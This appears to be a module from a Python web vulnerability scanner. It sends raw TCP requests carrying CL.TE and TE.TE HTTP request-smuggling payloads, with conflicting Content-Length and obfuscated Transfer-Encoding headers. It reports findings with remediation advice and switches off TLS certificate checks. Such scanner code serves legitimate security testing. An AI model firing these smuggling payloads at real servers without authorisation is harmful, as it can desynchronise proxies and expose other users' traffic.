#  M-25-20 — HTTP SMUGGLING DEEP
# ════════════════════════════════════════════════════════════════════════

class HTTPSmugglingDeep:
    """CL.TE and TE.CL HTTP request smuggling tests via raw TCP."""

    async def _send_raw(self, host: str, port: int, payload: bytes, timeout: float = 15.0) -> bytes:
        try:
            loop = asyncio.get_event_loop()
            def _sync():
                sock = _socket.create_connection((host, port), timeout=timeout)
                if port in (443, 8443):
                    ctx = _ssl_v25.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = _ssl_v25.CERT_NONE
                    sock = ctx.wrap_socket(sock, server_hostname=host)
                sock.sendall(payload)
                sock.settimeout(timeout)
                data = b""
                try:
                    while len(data) < 65536:
                        chunk = sock.recv(4096)
                        if not chunk:
                            break
                        data += chunk
                except Exception as _silenced_exc:
                    log("DEBUG", f"[suppressed] {_silenced_exc}")
                sock.close()
                return data
            return await asyncio.wait_for(loop.run_in_executor(None, _sync), timeout=timeout + 2)
        except Exception as e:
            log("DEBUG", f"[Smuggling] {e}")
            return b""

    async def scan(self, client: "WebScoutClient", target: str) -> list:
        findings = []
        from urllib.parse import urlparse
        parsed = urlparse(target)
        host = parsed.hostname or ""
        port = parsed.port or (443 if parsed.scheme == "https" else 80)
        path = parsed.path or "/"

        # CL.TE probe
        payload = (f"POST {path} HTTP/1.1\r\nHost: {host}\r\n"
                   f"Content-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nX\r\n\r\n"
                   ).encode()
        try:
            raw = await self._send_raw(host, port, payload)
            if raw and b"200" in raw[:20]:
                findings.append(Finding(
                    plugin="http_smuggling_cl_te",
                    title="HTTP Request Smuggling — CL.TE Desync Potential",
                    severity="CRITICAL", confidence=70.0,
                    description="Conflicting CL/TE headers accepted with HTTP 200. Possible CL.TE desync smuggling.",
                    evidence=f"Host: {host}:{port}\nResponse prefix: {raw[:200].decode('utf-8', errors='replace')}",
                    url=target,
                    remediation="Configure proxy to reject requests with both CL and TE headers. Use HTTP/2 end-to-end.",
                    tags=["smuggling", "cl-te", "desync", "critical"],
                ))
        except Exception as e:
            log("DEBUG", f"[Smuggling] CL.TE: {e}")

        # TE.TE obfuscation probe
        payload2 = (f"POST {path} HTTP/1.1\r\nHost: {host}\r\n"
                    f"Content-Length: 4\r\nTransfer-Encoding: xchunked\r\n"
                    f"Transfer-encoding: chunked\r\n\r\n5c\r\nSMUGGLED\r\n0\r\n\r\n"
                    ).encode()
        try:
            raw2 = await self._send_raw(host, port, payload2)
            if raw2 and b"SMUGGLED" in raw2:
                findings.append(Finding(
                    plugin="http_smuggling_te_te",
                    title="HTTP Smuggling — TE.TE Obfuscated Header Accepted",
                    severity="CRITICAL", confidence=82.0,
                    description="Obfuscated Transfer-Encoding headers caused SMUGGLED payload to appear in response.",
                    evidence=f"Response snippet: {raw2[:300].decode('utf-8', errors='replace')}",
                    url=target,
                    remediation="Reject requests with duplicate/malformed Transfer-Encoding headers.",
                    tags=["smuggling", "te-te", "critical"],
                ))
        except Exception as e:
            log("DEBUG", f"[Smuggling] TE.TE: {e}")

        log("SMUG", f"HTTPSmugglingDeep: {len(findings)} findings")
        return findings


